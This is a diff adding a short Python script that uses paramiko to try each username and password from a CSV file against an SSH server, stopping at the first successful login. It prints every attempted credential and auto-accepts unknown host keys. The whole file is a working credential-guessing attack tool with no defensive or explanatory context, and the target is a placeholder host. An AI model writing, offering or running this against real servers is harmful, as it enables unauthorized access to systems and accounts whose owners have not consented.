@@ -1,0 +1,21 @@
+import csv
+import paramiko
+
+# Read the CSV file containing the login credentials
+with open("password.csv") as csvfile:
+    reader = csv.reader(csvfile)
+    headers = next(reader) # skip the header row
+    credentials = list(reader)
+
+# Connect to the SSH server and try each set of credentials
+ssh = paramiko.SSHClient()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+for username, password in credentials:
+    try:
+        ssh.connect("hostname_or_ip", username=username, password=password)
+        print(f"Successful login with {username}:{password}")
+        break # exit the loop if a successful login is found
+    except paramiko.ssh_exception.AuthenticationException:
+        print(f"Failed login with {username}:{password}")
+
+ssh.close()
